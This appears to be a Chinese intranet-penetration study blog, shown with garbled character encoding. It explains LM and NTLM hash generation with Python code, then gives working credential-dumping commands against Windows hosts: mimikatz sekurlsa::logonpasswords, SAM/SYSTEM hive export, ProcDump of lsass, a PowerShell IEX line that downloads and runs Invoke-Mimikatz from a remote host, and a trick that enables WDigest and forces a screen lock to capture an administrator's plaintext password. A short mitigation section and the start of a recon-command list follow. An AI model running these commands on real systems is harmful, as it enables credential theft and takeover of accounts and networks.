<li><p>3.å¯†ç çš„16è¿›åˆ¶è¢«åˆ†æˆä¸¤ä¸ª7byteéƒ¨åˆ†ï¼Œæ¯éƒ¨åˆ†è½¬æ¢æˆæ¯”ç‰¹æµï¼Œå¹¶ä¸”é•¿åº¦ä¸ºä¸º56bitï¼Œé•¿åº¦ä¸è¶³åˆ™åœ¨å·¦è¾¹ç”¨0è¡¥é½</p>
</li>
<li><p>4.å†åˆ†ä¸º7bitä¸ºä¸€ç»„ï¼Œæ¯ç»„æœ«å°¾åŠ 0ï¼Œå†ç»„æˆä¸€ç»„</p>
</li>
<li><p>5.å°†ä»¥ä¸Šæ­¥éª¤å¾—åˆ°çš„ä¸¤ç»„8å­—èŠ‚ç¼–ç ï¼Œåˆ†åˆ«ä½œä¸ºDESåŠ å¯†keyä¸ºé­”æœ¯å­—ç¬¦ä¸²â€œKGS!@#$% â€è¿›è¡ŒåŠ å¯†</p>
</li>
</ul>
<br>

<p>å‚è€ƒ<a href="https://blog.csdn.net/endeav_or/article/details/50196325">https://blog.csdn.net/endeav_or/article/details/50196325</a></p>
<p>ä»¥è¿™ç¯‡æ–‡å­—ç»™å‡ºçš„ 123994 ä¸ºä¾‹</p>
<p>å°† 123994 ä½¿ç”¨æ–‡æœ¬ç¼–è¾‘å™¨ è½¬æ¢ä¸ºåå…­è¿›åˆ¶ </p>
<p><img src="/posts/11da9eaf/LM-Hash1.png"></p>
<p>è½¬æ¢å ä¸º <code>313233393934</code> (12*4 bits) è€Œä¸ºäº†æ»¡è¶³14å­—èŠ‚(14 * 8 bits) åç»­å…¨éƒ½ç”¨0è¡¥å…¨</p>
<p>æ‰€ä»¥ è¡¥å…¨åçš„åå…­è¿›åˆ¶ä¸º <code>3132333939340000 0000000000000000</code></p>
<p>å°†ä»¥ä¸Šç¼–ç åˆ†è¯2ç»„7å­—èŠ‚(7*8 bits)   <code>3132333939340000</code>  <code>0000000000000000</code></p>
<p>å°†ä»¥ä¸Šä¸¤ç»„7å­—èŠ‚çš„åå…­è¿›åˆ¶è½¬æ¢ä¸º äºŒè¿›åˆ¶ï¼Œæ¯7bit ä¸€ç»„æœ«å°¾åŠ 0ï¼Œå†è½¬æ¢ä¸ºåå…­è¿›åˆ¶ç»„æˆçš„ä¸¤ç»„8å­—èŠ‚çš„ç¼–ç </p>
<p><code>31323339393400</code> è½¬æ¢ä¸º äºŒè¿›åˆ¶ä½</p>
<p><code>00110001001100100011001100111001001110010011010000000000</code> é•¿åº¦ä¸è¶³ä¾¿åœ¨å·¦è¾¹è¡¥0 è¿™é‡Œä»è®¡ç®—å™¨å¤åˆ¶è¿‡æ¥æ²¡æœ‰å‰é¢ä¸¤ä¸ª0</p>
<p><code>0011000  1001100  1000110  0110011  1001001  1100100  1101000 0000000</code> æ¯7ä½åˆ†ä¸ºä¸€ç»„</p>
<p><code>00110000  10011000  10001100  01100110  10010010  11001000  11010000 00000000 </code>  æ¯ä¸€ç»„æœ«å°¾è¡¥0</p>
<p>å°†æ¯ä¸€ç»„è½¬æ¢ä½åå…­è¿›åˆ¶</p>
<p><code>00110000  10011000  1000110 001100110  10010010  11001000  11010000 00000000 </code></p>
<p><code>30       98        8C        66        92         C8        D0        00 </code></p>
<p>æœ€ç»ˆå¾—åˆ° <code>30988C6692C8D000</code>  åŒç† <code>00000000000000</code> (14ä¸ª0 ) å¾—åˆ° <code>0000000000000000</code>(16ä¸ª0)</p>
<p>æœ€åå†å°† ä»¥ä¸Šä¸¤ç»„8å­—èŠ‚ç¼–ç  åˆ†åˆ«ä½œä¸ºDES åŠ å¯†çš„å¯†é’¥ ä¸º é­”æœ¯å­—ç¬¦ä¸²â€œKGS!@#$% â€è¿›è¡ŒåŠ å¯†</p>
<p>è¯¥é­”æœ¯å­—ç¬¦ä¸²è½¬æ¢ä¸º16è¿›åˆ¶ä¸º <code>4B47532140232425</code></p>
<p><img src="/posts/11da9eaf/KGS.png"></p>
<p>å°†ä¸¤ç»„DESåŠ å¯†åçš„ç¼–ç æ‹¼æ¥ï¼Œ<br>å¾—åˆ°æœ€ç»ˆLM-Hashå€¼ä¸ºï¼š<br>FAE8BB9ECB799902 AAD3B435B51404EE</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pythonå®ç°LM-HASHè„šæœ¬</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DesEncrypt</span>(<span class="params"><span class="built_in">str</span>, Des_Key</span>):</span><br><span class="line">    k = des(Des_Key, ECB, pad=<span class="literal">None</span>)</span><br><span class="line">    EncryptStr = k.encrypt(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> binascii.b2a_hex(EncryptStr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Zero_padding</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    b = []</span><br><span class="line">    l = <span class="built_in">len</span>(<span class="built_in">str</span>)</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">        <span class="keyword">if</span> (num &lt; <span class="number">8</span>) <span class="keyword">and</span> n % <span class="number">7</span> == <span class="number">0</span>:</span><br><span class="line">            b.append(<span class="built_in">str</span>[n:n + <span class="number">7</span>] + <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            num = num + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    test_str = <span class="string">&quot;123994&quot;</span></span><br><span class="line">    <span class="comment"># ç”¨æˆ·çš„å¯†ç è½¬æ¢ä¸ºå¤§å†™,å¹¶è½¬æ¢ä¸º16è¿›åˆ¶å­—ç¬¦ä¸²</span></span><br><span class="line">    test_str = test_str.upper().encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    str_len = <span class="built_in">len</span>(test_str)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¯†ç ä¸è¶³14å­—èŠ‚å°†ä¼šç”¨0æ¥è¡¥å…¨</span></span><br><span class="line">    <span class="keyword">if</span> str_len &lt; <span class="number">28</span>:</span><br><span class="line">        test_str = test_str.ljust(<span class="number">28</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å›ºå®šé•¿åº¦çš„å¯†ç è¢«åˆ†æˆä¸¤ä¸ª7byteéƒ¨åˆ†</span></span><br><span class="line">    t_1 = test_str[<span class="number">0</span>:<span class="built_in">len</span>(test_str) / <span class="number">2</span>]</span><br><span class="line">    t_2 = test_str[<span class="built_in">len</span>(test_str) / <span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ¯éƒ¨åˆ†è½¬æ¢æˆæ¯”ç‰¹æµï¼Œå¹¶ä¸”é•¿åº¦ä½56bitï¼Œé•¿åº¦ä¸è¶³ä½¿ç”¨0åœ¨å·¦è¾¹è¡¥é½é•¿åº¦</span></span><br><span class="line">    t_1 = <span class="built_in">bin</span>(<span class="built_in">int</span>(t_1, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    t_2 = <span class="built_in">bin</span>(<span class="built_in">int</span>(t_2, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å†åˆ†7bitä¸ºä¸€ç»„æœ«å°¾åŠ 0ï¼Œç»„æˆæ–°çš„ç¼–ç </span></span><br><span class="line">    t_1 = Zero_padding(t_1)</span><br><span class="line">    t_2 = Zero_padding(t_2)</span><br><span class="line">    <span class="built_in">print</span> t_1</span><br><span class="line">    t_1 = <span class="built_in">hex</span>(<span class="built_in">int</span>(t_1, <span class="number">2</span>))</span><br><span class="line">    t_2 = <span class="built_in">hex</span>(<span class="built_in">int</span>(t_2, <span class="number">2</span>))</span><br><span class="line">    t_1 = t_1[<span class="number">2</span>:].rstrip(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">    t_2 = t_2[<span class="number">2</span>:].rstrip(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;0&#x27;</span> == t_2:</span><br><span class="line">        t_2 = <span class="string">&quot;0000000000000000&quot;</span></span><br><span class="line">    t_1 = binascii.a2b_hex(t_1)</span><br><span class="line">    t_2 = binascii.a2b_hex(t_2)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä¸Šæ­¥éª¤å¾—åˆ°çš„8byteäºŒç»„ï¼Œåˆ†åˆ«ä½œä¸ºDES keyä¸º&quot;KGS!@#$%&quot;è¿›è¡ŒåŠ å¯†ã€‚</span></span><br><span class="line">    LM_1 = DesEncrypt(<span class="string">&quot;KGS!@#$%&quot;</span>, t_1)</span><br><span class="line">    LM_2 = DesEncrypt(<span class="string">&quot;KGS!@#$%&quot;</span>, t_2)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å°†äºŒç»„DESåŠ å¯†åçš„ç¼–ç æ‹¼æ¥ï¼Œå¾—åˆ°æœ€ç»ˆLM HASHå€¼ã€‚</span></span><br><span class="line">    LM = LM_1 + LM_2</span><br><span class="line">    <span class="built_in">print</span> LM</span><br></pre></td></tr></table></figure>

<h5 id="LM-Hash-ç¼ºç‚¹"><a href="#LM-Hash-ç¼ºç‚¹" class="headerlink" title="LM Hash ç¼ºç‚¹"></a>LM Hash ç¼ºç‚¹</h5><p>1.å¯†ç é•¿åº¦æœ€å¤§åªèƒ½ä¸º14ä¸ªå­—ç¬¦</p>
<p>2.å¯†ç æ— æ³•åŒºåˆ†å¤§å°å†™</p>
<p>3.å¦‚æœå¯†ç å¼ºåº¦å°äº7ä½ï¼Œé‚£ä¸ªç¬¬äºŒä¸ªåˆ†ç»„åŠ å¯†åçš„ç»“æœä¸€å®šä¸º aad3b435b51404ee</p>
<p>4.Des å®¹æ˜“è¢«ç ´è§£ å¯†ç å¼ºåº¦ä¸é«˜</p>
<br>

<p>åœ¨Windows Vista å’Œ Windows Server 2008 ç‰ˆæœ¬å Windowsé»˜è®¤ç¦ç”¨äº†LM Hashã€‚LM-Hash æ˜æ–‡å¯†ç é™åˆ¶åœ¨14ä½ä»¥å†…ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœLM Hashè¢«ç¦ç”¨äº†ï¼Œæ”»å‡»è€…é€šè¿‡å·¥å…·æŠ“å–çš„LM Hash é€šå¸¸ä¸º aad3b435b51404eeaad3b435b51404ee</p>
<br>

<h4 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h4><p>NT LAN Manager (NTML) Hash  æ˜¯åŸºäºMD4ç®—æ³•ã€‚ä»Windows Vista/Windows Server 2003ä»¥åWindowsçš„é»˜è®¤è®¤è¯æ–¹å¼å‡ä¸ºNTLM Hash</p>
<h5 id="NTLM-Hashç”ŸæˆåŸç†"><a href="#NTLM-Hashç”ŸæˆåŸç†" class="headerlink" title="NTLM Hashç”ŸæˆåŸç†"></a>NTLM Hashç”ŸæˆåŸç†</h5><p>1.å°†ç”¨æˆ·å¯†ç ï¼ˆè½¬ä¸ºASCII å†ï¼‰è½¬æ¢ä¸ºåå…­è¿›åˆ¶</p>
<p>2.å°†åå…­è¿›åˆ¶æ ¼å¼çš„å¯†ç è¿›è¡ŒUnicodeç¼–ç </p>
<p>3.ä½¿ç”¨MD4æ‘˜è¦ç®—æ³•å¯¹Unicodeç¼–ç æ•°æ®è¿›è¡ŒHashè®¡ç®—</p>
<br>

<p>ä»¥å¯†ç 123456ä¸ºä¾‹ ï¼Œ</p>
<ul>
<li>é¦–å…ˆå°†å¯†ç å­—ç¬¦ä¸²è½¬æ¢ä¸ºASCIIå­—ç¬¦ä¸²ï¼Œ123456 =&gt; 49 50 51 52 53 54</li>
<li>ASCIIå­—ç¬¦ä¸²åœ¨è½¬æ¢ä¸ºåå…­è¿›åˆ¶ï¼Œ49 50 51 52 53 54 =&gt; 31 32 33 34 35 36 </li>
<li>å†è¿›è¡ŒUnicode ç¼–ç ï¼Œ 31 32 33 34 35 36 =&gt; </li>
</ul>
<br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib,binascii;</span><br><span class="line"><span class="built_in">print</span> binascii.hexlify(hashlib.new(<span class="string">&quot;md4&quot;</span>, <span class="string">&quot;123456&quot;</span>.encode(<span class="string">&quot;utf-16le&quot;</span>)).digest())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 123456 </span></span><br><span class="line"><span class="comment"># 32ed87bdb5fdc5e9cba88547376818d4</span></span><br></pre></td></tr></table></figure>

<br>

<h3 id="å¯†ç æŠ“å–"><a href="#å¯†ç æŠ“å–" class="headerlink" title="å¯†ç æŠ“å–"></a>å¯†ç æŠ“å–</h3><h4 id="GetPassword"><a href="#GetPassword" class="headerlink" title="GetPassword"></a>GetPassword</h4><p>ç›´æ¥ä½¿ç”¨ç®¡ç†å‘˜æƒé™çš„cmd è¿è¡Œ GetPassword.exe å³å¯</p>
<p><img src="/posts/11da9eaf/GetPassword.png"></p>
<h4 id="PwDump7"><a href="#PwDump7" class="headerlink" title="PwDump7"></a>PwDump7</h4><p>å¯ä»¥å¾—åˆ°ç³»ç»Ÿä¸­æ‰€æœ‰åº„æˆ·çš„NTML Hash </p>
<p><img src="/posts/11da9eaf/PwDUmp7.png"></p>
<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p>ä¸‹è½½åœ°å€:<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
<p>Minikatz ç”¨äºWindowsä¸‹è¯»å–å·²ç»ç™»å½•è¿‡çš„ç”¨æˆ·çš„Hash å’Œæ˜æ–‡å¯†ç ï¼Œéœ€è¦adminæˆ–è€…systemæƒé™</p>
<h5 id="æœ¬åœ°äº¤äº’å¼æŠ“å–"><a href="#æœ¬åœ°äº¤äº’å¼æŠ“å–" class="headerlink" title="æœ¬åœ°äº¤äº’å¼æŠ“å–"></a>æœ¬åœ°äº¤äº’å¼æŠ“å–</h5><p><code>mimikatz # privilege::debug</code> æå‡æƒé™</p>
<p><code>mimikatz # log</code> å¯åŠ¨æ—¥å¿—è®°å½•åŠŸèƒ½</p>
<p><code>mimikatz # sekurlsa::logonpasswords</code> è¯»å–å­˜å‚¨åœ¨è®¡ç®—æœºä¸Šçš„æ˜æ–‡å¯†ç å’ŒHashå€¼</p>
<h5 id="æœ¬åœ°éäº¤äº’å¼æŠ“å–"><a href="#æœ¬åœ°éäº¤äº’å¼æŠ“å–" class="headerlink" title="æœ¬åœ°éäº¤äº’å¼æŠ“å–"></a>æœ¬åœ°éäº¤äº’å¼æŠ“å–</h5><p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit &gt; mimikatz.txt</code></p>
<h4 id="powershell-åŠ è½½-mimikatzæŠ“å–"><a href="#powershell-åŠ è½½-mimikatzæŠ“å–" class="headerlink" title="powershell åŠ è½½ mimikatzæŠ“å–"></a>powershell åŠ è½½ mimikatzæŠ“å–</h4><p>å¯ä»¥è¿æ¥å¤–ç½‘æƒ…å†µä¸‹</p>
<p><code>powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz</code></p>
<p>å†…ç½‘æƒ…å†µä¸‹ï¼Œå¯ä»¥æ­å»ºä¸€ä¸ªæœ¬åœ°webæœåŠ¡å™¨ï¼Œä½¿ç”¨å†…ç½‘ipå»è®¿é—®</p>
<p><code>powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.0.137/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz</code></p>
<br>

<h4 id="é€šè¿‡SAM-å’Œ-System-æ–‡ä»¶æŠ“å–å¯†ç "><a href="#é€šè¿‡SAM-å’Œ-System-æ–‡ä»¶æŠ“å–å¯†ç " class="headerlink" title="é€šè¿‡SAM å’Œ System æ–‡ä»¶æŠ“å–å¯†ç "></a>é€šè¿‡SAM å’Œ System æ–‡ä»¶æŠ“å–å¯†ç </h4><p>å¯¼å‡ºSAM æ–‡ä»¶å’Œ System æ–‡ä»¶<br><code>reg save hklm\sam sam.hive</code><br><code>reg save hklm\system system.hive</code><br>ç„¶åå°†è¿™ä¸¤ä¸ªæ–‡ä»¶æ”¾åˆ°mimikatzçš„åŒç›®å½•ä¸‹ï¼Œè¿è¡Œmmimikatz<br><code>lsadump::sam /sam:sam.hive /system:system.hive</code><br><img src="/posts/11da9eaf/sam_system_hash.png"><br>å¾—åˆ°NTLMä¸º<code>31d6cfe0d16ae931b73c59d7e0c089c0</code><br>åœ¨ç½‘ç«™ä¸Šè¿›è¡Œè§£å¯†<br><img src="/posts/11da9eaf/cmd5_NTLM.png"><br>å¾—åˆ°å¯†ç ä¸ºç©º ï¼ˆè¯¥æœºå™¨å¯†ç åœ¨è®¾ç½®æ—¶è®¾ä¸ºäº†ç©ºï¼‰</p>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨ophcrack ï¼ˆ<a href="https://www.objectif-securite.ch/ophcrack%EF%BC%89">https://www.objectif-securite.ch/ophcrackï¼‰</a></p>
<p><img src="/posts/11da9eaf/ophcrack.png"></p>
<p>é€‚ç”¨åœºæ™¯ï¼šè·å¾—äº†systemæƒé™ï¼Œä½†æ˜¯æ— æ³•åœ¨ç›®æ ‡æœºå™¨ä¸Šä¸Šä¼ æˆ–ä½¿ç”¨ Mimikatzï¼Œè¿™æ—¶å€™å°±å¯ä»¥ä½¿ç”¨regå‘½ä»¤å¯¼å‡ºSamå’ŒSystemæ–‡ä»¶ ç„¶åç¦»çº¿è¯»å–å¤„NTML Hash ã€‚å¯ä»¥è€ƒè™‘ä½¿ç”¨åœ¨çº¿è§£å¯†ç½‘ç«™æˆ–è€…hash ä¼ é€’æ–¹å¼å¾—åˆ°æ˜æ–‡ã€‚</p>
<br>

<h4 id="ä½¿ç”¨Powershellè¿›è¡ŒDump-Hashs"><a href="#ä½¿ç”¨Powershellè¿›è¡ŒDump-Hashs" class="headerlink" title="ä½¿ç”¨Powershellè¿›è¡ŒDump Hashs"></a>ä½¿ç”¨Powershellè¿›è¡ŒDump Hashs</h4><p>â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦</p>
<h4 id="ProcDump-mimikatz"><a href="#ProcDump-mimikatz" class="headerlink" title="ProcDump + mimikatz"></a>ProcDump + mimikatz</h4><p>ProcDump æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œç¨‹åºï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿åœ°å°†ç³»ç»Ÿæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹è½¬å­˜å‚¨ç”Ÿæˆä¸º dump æ–‡ä»¶,æ˜¯ä¸€æ¬¾å¾®è½¯è‡ªå®¶å‡ºå“è½¯ä»¶ï¼Œæ‰€ä»¥å¯ä»¥è¿‡å¾ˆå¤šæ€è½¯ã€‚</p>
<h5 id="dump-lsass-exe-è¿›ç¨‹"><a href="#dump-lsass-exe-è¿›ç¨‹" class="headerlink" title="dump lsass.exe è¿›ç¨‹"></a>dump lsass.exe è¿›ç¨‹</h5><p>æ‰“å¼€ä»»åŠ¡ç®¡ç†å™¨ æ‰¾åˆ° lsass.exe(Local Security Authority Process) è¿›ç¨‹ï¼Œé€‰æ‹©åˆ›å»ºè½¬å‚¨æ–‡ä»¶</p>
<p><img src="/posts/11da9eaf/dump_lsass.png"></p>
<p><img src="/posts/11da9eaf/dump_lsass2.png"></p>
<p>è¿™é‡Œç”Ÿæˆçš„ä½ç½®åœ¨AppData\Local ä¸‹ å¦‚æœæ²¡æ˜¾ç¤ºè¯¥æ–‡ä»¶ç›®å½• ç‚¹å‡»ç»„ç»‡-&gt;æ–‡ä»¶å¤¹å’Œæœç´¢é€‰é¡¹-&gt;æŸ¥çœ‹ å°†æ˜¾ç¤ºçš„éšè—æ–‡ä»¶ã€æ–‡ä»¶å¤¹å’Œé©±åŠ¨å™¨å‰ç‚¹å‹¾</p>
<p><img src="/posts/11da9eaf/dump_lsass3.png"></p>
<p>ä½¿ç”¨procdump.exe å¯¼å‡ºlsass.exe</p>
<p><code>Procdump.exe -accepteula -ma lsass.exe lsass.dmp</code></p>
<h5 id="è¯»å–dumpæ–‡ä»¶"><a href="#è¯»å–dumpæ–‡ä»¶" class="headerlink" title="è¯»å–dumpæ–‡ä»¶"></a>è¯»å–dumpæ–‡ä»¶</h5><p>ç„¶åå°†ç”Ÿæˆçš„ lsass.dmp æ–‡ä»¶æ”¾åˆ° mimikatz çš„åŒç›®å½•ä¸‹ï¼Œè¿è¡Œmimikatz</p>
<p>ç›´æ¥è¯»å–æ˜æ–‡å¯†ç  </p>
<p><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::tspkg&quot; exit</code></p>
<p>è¯»å–æ˜æ–‡å¯†ç å’Œhash å€¼(æ˜¾ç¤ºçš„ä¿¡æ¯æ›´å…¨)</p>
<p><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords&quot; exit</code></p>
<h4 id="éƒ¨åˆ†ç³»ç»Ÿçš„æŠ“å–å°è¯•"><a href="#éƒ¨åˆ†ç³»ç»Ÿçš„æŠ“å–å°è¯•" class="headerlink" title="éƒ¨åˆ†ç³»ç»Ÿçš„æŠ“å–å°è¯•"></a>éƒ¨åˆ†ç³»ç»Ÿçš„æŠ“å–å°è¯•</h4><h5 id="Windows-Server-2008-R2"><a href="#Windows-Server-2008-R2" class="headerlink" title="Windows Server 2008 R2"></a>Windows Server 2008 R2</h5><p><img src="/posts/11da9eaf/mimikatz_winserver2008.png"></p>
<h5 id="Windows7-x64"><a href="#Windows7-x64" class="headerlink" title="Windows7 x64"></a>Windows7 x64</h5><p><img src="/posts/11da9eaf/mimikatz_win7.png"></p>
<p>è¿™é‡ŒæŠ“å–çš„å¯†ç ä¸ºç©º å› ä¸ºåŸå¯†ç ä¸ºç©º çœ‹ä¸‹æŠ“å–çš„NTLMå€¼ ä¸ ç©ºå€¼çš„ç›¸åŒ</p>
<br>

<h3 id="é˜²èŒƒæªæ–½"><a href="#é˜²èŒƒæªæ–½" class="headerlink" title="é˜²èŒƒæªæ–½"></a>é˜²èŒƒæªæ–½</h3><p>å®‰è£… KB2871997 è¡¥ä¸ï¼Œå…³é—­WdigeståŠŸèƒ½(Windows Server 2012ä»¥ä¸Šç‰ˆæœ¬éƒ½æ˜¯é»˜è®¤å…³é—­çš„)</p>
<p>å®‰è£…å®Œè¯¥è¡¥ä¸åï¼Œç³»ç»Ÿé»˜è®¤ç¦ç”¨ Wdigest Auth ï¼Œå†…å­˜ï¼ˆlsassè¿›ç¨‹ï¼‰ä¸å†ä¿å­˜æ˜æ–‡å£ä»¤ã€‚Mimikatz å°†è¯»ä¸åˆ°å¯†ç æ˜æ–‡ã€‚</p>
<p>é€šè¿‡æ“¦å¥½çœ‹æ³¨å†Œè¡¨é”®å€¼ï¼Œå¯ä»¥åˆ¤æ–­WdigeståŠŸèƒ½çŠ¶æ€ï¼Œå¦‚æœè¯¥å€¼ä¸º 1 åˆ™ä¸ºå¼€å¯ï¼Œå³å¯è·å–æ˜æ–‡å¯†ç ï¼Œå¦‚æœæ”¹å€¼ä¸º0 åˆ™æ˜æ–‡å¯†ç å°±ä¸ä¼šå‡ºç°åœ¨å†…å­˜ä¸­ã€‚</p>
<p>å¼€å¯æˆ–å…³é—­Wdigest çš„å‘½ä»¤:</p>
<p>ï¼ˆ1ï¼‰ reg add å‘½ä»¤</p>
<p>å¼€å¯Wdigest Auth    </p>
<p><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></p>
<p>å…³é—­Wdigest Auth</p>
<p><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</code></p>
<p> ï¼ˆ2ï¼‰ä½¿ç”¨powershell</p>
<p>å¼€å¯Wdigest Auth</p>
<p><code>Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1</code></p>
<p>å…³é—­Wdigest Auth</p>
<p><code>Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0</code></p>
<p>(3) åˆ©ç”¨meterpreter</p>
<p>å¼€å¯Wdigest Auth</p>
<p><code>reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1</code></p>
<p>å…³é—­Wdigest Auth</p>
<p><code>reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 0</code></p>
<br>

<p>è®°å½•ä¸€ä½å¸ˆå‚…æ–‡ç« çš„æ€è·¯(<a href="https://github.com/x0rz4/Intranet-information">https://github.com/x0rz4/Intranet-information</a>)</p>
<p>æ‹¿åˆ°äº†adminçš„cmdæƒé™ï¼Œç®¡ç†å‘˜ä½¿ç”¨å¯†ç ç™»å½•äº†æœºå™¨ï¼Œå¼€å¯äº†lsass.exeè¿›ç¨‹ï¼ŒæŠŠå¯†ç ä¿å­˜åœ¨äº†å†…å­˜æ–‡ä»¶lsassè¿›ç¨‹ä¸­ã€‚</p>
<p>æƒ³è¦çš„æŠ“å–æ˜æ–‡ï¼Œä¿®æ”¹æ³¨å†Œè¡¨å¼€å¯Wdigest ï¼Œç„¶ååˆ©ç”¨cmdçš„å¼ºåˆ¶é”å±ï¼Œç­‰å¾…ç®¡ç†å‘˜é‡æ–°è¾“å…¥å¯†ç ç™»å½•ç³»ç»Ÿï¼Œè¿™æ ·å¯†ç å°±è¢«è®°å½•åœ¨äº†lsasså†…å­˜æ–‡ä»¶ä¸­ï¼Œç„¶åä½¿ç”¨procdumpå¯¼å‡ºlsass.dmpï¼Œä½¿ç”¨mimikatzè¿›è¡Œè¯»å–æ˜æ–‡å’Œhash</p>
<p>å¼ºåˆ¶é”å±å‘½ä»¤:</p>
<p>cmd <code>rundll32 user32.dll,LockWorkStation</code></p>
<br>

<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://www.sqlsec.com/2019/11/winhash.html">https://www.sqlsec.com/2019/11/winhash.html</a></p>
<p><a href="https://xz.aliyun.com/t/2445">https://xz.aliyun.com/t/2445</a></p>
<p><a href="https://blog.csdn.net/endeav_or/article/details/50196325">https://blog.csdn.net/endeav_or/article/details/50196325</a></p>
</blockquote>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>å†…ç½‘æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>å†…ç½‘æ¸—é€å­¦ä¹ ç¬”è®°</title>
    <url>/posts/11ff0b53/</url>
    <content><![CDATA[<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><h4 id="ç½‘ç»œä¿¡æ¯"><a href="#ç½‘ç»œä¿¡æ¯" class="headerlink" title="ç½‘ç»œä¿¡æ¯"></a>ç½‘ç»œä¿¡æ¯</h4><br>

<p><code>ipconfig /all </code>æŸ¥è¯¢ç½‘ç»œé…ç½®</p>
<h4 id="ç”¨æˆ·ä¿¡æ¯"><a href="#ç”¨æˆ·ä¿¡æ¯" class="headerlink" title="ç”¨æˆ·ä¿¡æ¯"></a>ç”¨æˆ·ä¿¡æ¯</h4><p><code>net user </code> æŸ¥è¯¢ç”¨æˆ·åˆ—è¡¨</p>
<p><code>net user XXX /domain</code>   æŸ¥è¯¢æŒ‡å®šç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯</p>
<p><code>net localgroup administrators</code> æŸ¥çœ‹å½“å‰ç”¨æˆ·æƒé™</p>
<p><code>net localgroup administrators ç”¨æˆ·å /add </code> æ·»åŠ ç”¨æˆ·åˆ°ç®¡ç†ç»„  `</p>
<p><code>quser</code>  / <code>quser UserName</code>  / <code>qwinsta</code>æŸ¥çœ‹å½“å‰åœ¨çº¿ç”¨æˆ·</p>
<h4 id="è¿›ç¨‹ä¿¡æ¯"><a href="#è¿›ç¨‹ä¿¡æ¯" class="headerlink" title="è¿›ç¨‹ä¿¡æ¯"></a>è¿›ç¨‹ä¿¡æ¯</h4><p><code>tasklist /v</code>  æŸ¥è¯¢è¿›ç¨‹åˆ—è¡¨</p>
<p><code>wmic process list brief</code> æŸ¥è¯¢è¿›ç¨‹åˆ—è¡¨</p>
